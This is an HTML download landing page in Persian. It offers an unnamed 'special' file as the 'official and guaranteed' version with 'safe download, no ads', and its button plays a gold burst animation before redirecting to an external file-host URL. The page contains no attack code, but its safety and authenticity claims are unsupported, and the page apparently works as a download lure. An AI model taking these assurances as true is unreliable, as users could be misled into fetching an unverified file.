<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>دانلود</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    min-height: 100vh; display: grid; place-items: center;
    background:
      radial-gradient(circle at 50% 20%, rgba(255,215,120,.18), transparent 55%),
      repeating-linear-gradient(135deg, #1a1207 0 22px, #201608 22px 44px);
    font-family: Tahoma, sans-serif; overflow: hidden; padding: 20px;
  }
  .card {
    position: relative; text-align: center;
    padding: 42px 46px 38px;
    border-radius: 26px;
    background: linear-gradient(160deg, #2a1d08, #120c03 70%);
    border: 3px solid #d9a83a;
    box-shadow:
      0 0 0 1px #7a5a1a inset,
      0 0 60px rgba(255, 190, 70, .25),
      0 30px 60px -20px #000;
  }
  .crown {
    font-size: 40px; line-height: 1; margin-bottom: 14px;
    filter: drop-shadow(0 0 14px rgba(255,200,80,.8));
    animation: glow 2.2s ease-in-out infinite;
  }
  @keyframes glow {
    0%,100% { filter: drop-shadow(0 0 8px rgba(255,200,80,.5)); }
    50% { filter: drop-shadow(0 0 26px rgba(255,220,120,1)); }
  }
  .title {
    font-size: 34px; font-weight: 900; color: #ffe9a8;
    text-shadow: 0 2px 0 #6b4a10, 0 0 22px rgba(255,190,70,.5);
    letter-spacing: 1px;
  }
  .sub {
    margin-top: 12px; font-size: 17px; color: #d8c39a; line-height: 1.9;
  }
  .sub b { color: #ffd76a; }
  .btn {
    position: relative; margin-top: 30px;
    padding: 24px 56px; font-size: 30px; font-weight: 900;
    color: #241703; cursor: pointer; border: none; border-radius: 18px;
    background: linear-gradient(180deg, #ffe38a, #f5b528 55%, #c8871a);
    box-shadow:
      0 6px 0 #7a5310,
      0 14px 26px -6px rgba(0,0,0,.7),
      0 0 40px rgba(255,200,80,.45);
    text-shadow: 0 1px 0 rgba(255,255,255,.5);
    transition: transform .1s, box-shadow .1s;
    animation: breathe 1.9s ease-in-out infinite;
  }
  .btn:active {
    transform: translateY(4px);
    box-shadow: 0 2px 0 #7a5310, 0 6px 14px -4px rgba(0,0,0,.7);
  }
  @keyframes breathe {
    0%,100% { transform: scale(1); }
    50% { transform: scale(1.045); }
  }
  .note {
    margin-top: 20px; font-size: 14px; color: #a89267; letter-spacing: .5px;
  }
  .burst {
    position: fixed; left: 50%; top: 50%; width: 10px; height: 10px;
    border-radius: 50%; pointer-events: none; z-index: 99;
    transform: translate(-50%, -50%);
    background: radial-gradient(circle, #fff 0%, #ffe38a 30%, #f5b528 55%, #c8871a 75%, transparent 80%);
    box-shadow: 0 0 70px 26px rgba(255, 200, 80, .85);
    animation: burst 2.4s cubic-bezier(.2,.8,.2,1) forwards;
  }
  @keyframes burst {
    0%   { transform: translate(-50%, -50%) scale(.2); opacity: 1; }
    45%  { transform: translate(-50%, -50%) scale(95); opacity: 1; }
    75%  { transform: translate(-50%, -50%) scale(150); opacity: .5; filter: blur(4px); }
    100% { transform: translate(-50%, -50%) scale(210); opacity: 0; filter: blur(10px); }
  }
  .shard {
    position: fixed; left: 50%; top: 50%; width: 8px; height: 8px;
    border-radius: 50%; pointer-events: none; z-index: 98;
    transform: translate(-50%, -50%);
    animation: shard 2.4s ease-out forwards;
  }
  @keyframes shard {
    0%   { transform: translate(-50%, -50%) scale(1); opacity: 1; }
    60%  { opacity: 1; }
    100% { transform: translate(var(--x), var(--y)) scale(.2); opacity: 0; }
  }
</style>
</head>
<body>
<div class="card">
  <div class="crown">👑</div>
  <div class="title">دانلود ویژه</div>
  <div class="sub">نسخه‌ی <b>رسمی و تضمینی</b> برای شما آماده شده<br>روی دکمه بزنید و دریافت کنید</div>
  <button class="btn" id="dl">دریافت کنید</button>
  <div class="note">دانلود امن — بدون تبلیغات مزاحم</div>
</div>
<script>
  const TARGET = 'https://yukiapi.site/file/lBKPpn78';
  const btn = document.getElementById('dl');
  let busy = false;

  function spawnBurst() {
    const b = document.createElement('div');
    b.className = 'burst';
    document.body.appendChild(b);
    setTimeout(() => b.remove(), 2400);

    const colors = ['#ffe38a', '#f5b528', '#ffd76a', '#c8871a', '#fff3c4'];
    for (let i = 0; i < 44; i++) {
      const s = document.createElement('div');
      s.className = 'shard';
      const ang = Math.random() * Math.PI * 2;
      const dist = 130 + Math.random() * 400;
      s.style.setProperty('--x', Math.cos(ang) * dist + 'px');
      s.style.setProperty('--y', Math.sin(ang) * dist + 'px');
      s.style.background = colors[i % colors.length];
      s.style.boxShadow = '0 0 12px ' + colors[i % colors.length];
      document.body.appendChild(s);
      setTimeout(() => s.remove(), 2400);
    }
  }

  btn.addEventListener('click', () => {
    if (busy) return;
    busy = true;
    spawnBurst();
    setTimeout(() => { window.location.href = TARGET; }, 2400);
  });
</script>
</body>
</html>
